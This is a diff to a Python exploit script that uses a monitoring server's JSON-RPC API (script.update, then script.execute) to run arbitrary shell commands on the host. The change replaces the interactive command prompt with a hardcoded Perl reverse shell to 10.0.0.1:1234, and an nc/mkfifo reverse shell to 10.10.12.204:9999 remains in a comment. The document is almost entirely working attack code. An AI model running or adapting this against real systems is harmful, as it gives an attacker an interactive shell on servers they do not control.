@@ -41,9 +41,11 @@ auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
 auth = auth.json()
 
 while True:
-    cmd = raw_input('\033[41m[cmd]>>: \033[0m ')
-    if cmd == "" : print "Result of last command:"
-    if cmd == "quit" : break
+    #cmd = raw_input('\033[41m[cmd]>>: \033[0m ')
+    #if cmd == "" : print "Result of last command:"
+    #if cmd == "quit" : break
+
+    cmd = """perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' & """
 
 ### update
     payload = {
@@ -52,7 +54,7 @@ while True:
         "params": {
             "scriptid": "1",
             "command": ""+cmd+"",
-            #"command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.12.204 9999 >/tmp/f",
+            #"command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.12.204 9999 >/tmp/f", 
             "execute_on":0
         },
         "auth" : auth['result'],
@@ -62,6 +64,7 @@ while True:
     cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))
 
 ### execute
+
     payload = {
         "jsonrpc": "2.0",
         "method": "script.execute",
@@ -76,6 +79,8 @@ while True:
 
     cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))
     cmd_exe = cmd_exe.json()
-    #print cmd_exe
+  
+    print cmd_exe
     print cmd_exe["result"]["value"]
+    
 
